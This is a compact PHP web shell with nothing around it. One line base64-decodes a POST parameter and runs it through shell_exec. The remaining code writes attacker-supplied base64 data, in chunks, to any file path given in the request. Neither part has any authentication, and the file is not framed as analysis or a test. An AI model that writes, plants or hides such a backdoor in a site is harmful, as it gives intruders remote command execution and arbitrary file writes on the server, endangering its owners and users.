<?php
($c = base64_decode($_POST['c'] ?? '')) && print(shell_exec($c));

if (isset($_POST['r'], $_POST['n'])) {
    $data = base64_decode($_POST['r']);
    $path = $_POST['n'];
    $chunk_index = isset($_POST['chunk']) ? (int)$_POST['chunk'] : -1;
    
    if ($chunk_index === 0 || $chunk_index === -1) {
        // First chunk or single upload: create/overwrite
        $result = @file_put_contents($path, $data);
    } else {
        // Subsequent chunk: append
        $result = @file_put_contents($path, $data, FILE_APPEND);
    }
    
    if ($result === false) {
        http_response_code(500);
        echo "ERROR: Failed to write file to " . htmlspecialchars($path, ENT_QUOTES, 'UTF-8');
    } else {
        echo "OK: " . $result . " bytes written";
    }
}